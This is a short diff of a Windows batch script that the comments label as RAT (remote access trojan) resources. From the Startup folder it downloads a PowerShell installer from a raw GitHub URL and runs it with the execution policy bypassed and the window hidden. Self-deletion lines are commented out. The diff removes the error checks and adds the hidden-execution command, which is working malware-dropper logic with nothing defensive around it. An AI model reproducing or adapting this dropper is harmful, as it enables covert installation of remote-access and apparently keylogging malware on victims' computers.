@@ -38,17 +38,9 @@ cd %STARTUP%
 
 REM rat resources
 powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1' -OutFile installer.ps1"
-if %errorlevel% neq 0 (
-    echo Failed to download installer.ps1.
-    exit /b %errorlevel%
-)
 
 @REM Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File installer.ps1" -WindowStyle Hidden
-powershell -windowstyle hidden ./installer.ps1
-if %errorlevel% neq 0 (
-    echo Failed to execute installer.ps1.
-    exit /b %errorlevel%
-)
+powershell -ExecutionPolicy Bypass -File installer.ps1 -windowstyle hidden
 
 @REM self delete
 @REM del GetAdmnInstKL.cmd
